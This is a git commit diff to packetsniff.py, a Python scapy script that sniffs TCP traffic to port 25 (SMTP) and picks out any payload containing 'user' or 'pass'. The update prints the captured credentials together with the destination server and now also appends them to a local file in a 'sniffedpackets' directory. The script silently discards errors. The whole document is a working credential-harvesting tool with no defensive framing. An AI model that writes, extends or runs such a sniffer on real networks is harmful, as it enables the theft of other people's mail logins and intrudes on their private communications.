5444aa0005f2756e09cc70e36bac54e9d8161ad7
Amara_C <amara.cvg@gmail.com>
2023-03-14 02:12:21 +0000

    Update packetsniff.py

--- packetsniff.py
+++ packetsniff.py
@@ -1,10 +1,24 @@
 from scapy.all import *
+import os
 
 def packet_callback(packet):
-    if packet[TCP].payload:
-        mail_packet = str(packet[TCP].payload)
-        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
-            print("[*] Server: %s" % packet[IP].dst)
-            print("[*] %s" % packet[TCP].payload)
+    try:
+        if packet.haslayer(TCP) and packet.haslayer(Raw):
+            mail_packet = packet[TCP].payload.load.decode('utf-8', 'ignore')
+            if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+                print("[*] Server: %s" % packet[IP].dst)
+                print("[*] %s" % mail_packet)
 
-sniff(prn=packet_callback, filter="tcp", store=0)
+                # Save the captured packets to a file in the sniffedpackets directory
+                if not os.path.exists("sniffedpackets"):
+                    os.makedirs("sniffedpackets")
+
+                filename = "sniffedpackets/packets.txt"
+                with open(filename, "a") as f:
+                    f.write("[*] Server: %s\n" % packet[IP].dst)
+                    f.write("[*] %s\n" % mail_packet)
+
+    except:
+        pass
+
+sniff(prn=packet_callback, filter="tcp dst port 25", store=0)
